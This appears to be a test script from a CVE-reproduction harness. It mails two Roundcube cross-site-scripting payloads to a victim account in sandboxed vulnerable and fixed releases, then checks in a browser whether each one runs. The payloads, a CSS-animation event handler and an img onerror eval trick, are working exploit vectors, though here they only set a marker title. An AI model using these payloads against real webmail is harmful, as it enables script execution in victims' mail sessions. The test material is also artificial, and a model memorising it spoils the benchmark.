from __future__ import annotations

import argparse
import json
import uuid

from autonomous_cve_target_adapters_v3 import (
    prepare_roundcube_2026_target,
    prepare_roundcube_target,
)
from check_stage3a_roundcube_cve_pair import VICTIM_USERNAME


PAYLOADS = {
    32: (
        '<body title="bgcolor=foo" name="bar style=animation-name:'
        "progress-bar-stripes onanimationstart=document['title']='ALT_CVE_32_EXECUTED' "
        'foo=bar"><p>Alternative browser execution</p></body>'
    ),
    34: (
        'a@a.co?]<img/src="x"/hidden/name="document[\'title\']=\'ALT_CVE_34_EXECUTED\'"'
        "/onerror=eval(name)>"
    ),
}


def check_release(number: int, release: str) -> dict[str, object]:
    trial_id = uuid.uuid4().hex
    prepare = prepare_roundcube_target if number == 32 else prepare_roundcube_2026_target
    prepared = prepare(trial_id, number, release_name=release)
    try:
        executor = prepared.executor
        effects: list[str] = []
        executor._record_effect_once = lambda: effects.append("browser.code_executed")
        subject = f"Alternate-{number}-{trial_id[:8]}"
        sent = executor.execute_smtp(
            {
                "kind": "smtp",
                "session": "attacker",
                "mail_from": "attacker@example.test",
                "mail_to": VICTIM_USERNAME,
                "mail_subject": subject,
                "mail_html": PAYLOADS[number],
                "mail_subtype": "html" if number == 32 else "plain",
            }
        )
        if sent["returncode"] != 0:
            raise RuntimeError(f"mail could not be sent: {sent['response']}")
        executor.execute_browser(
            {"kind": "browser", "session": "victim_browser", "path": "/", "browser_wait_ms": 2200}
        )
        return {"scenario": number, "release": release, "effect_events": len(effects)}
    finally:
        prepared.cleanup()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("scenario", type=int, choices=(32, 34))
    args = parser.parse_args()
    for release in ("vulnerable", "fixed"):
        print(json.dumps(check_release(args.scenario, release)), flush=True)


if __name__ == "__main__":
    main()
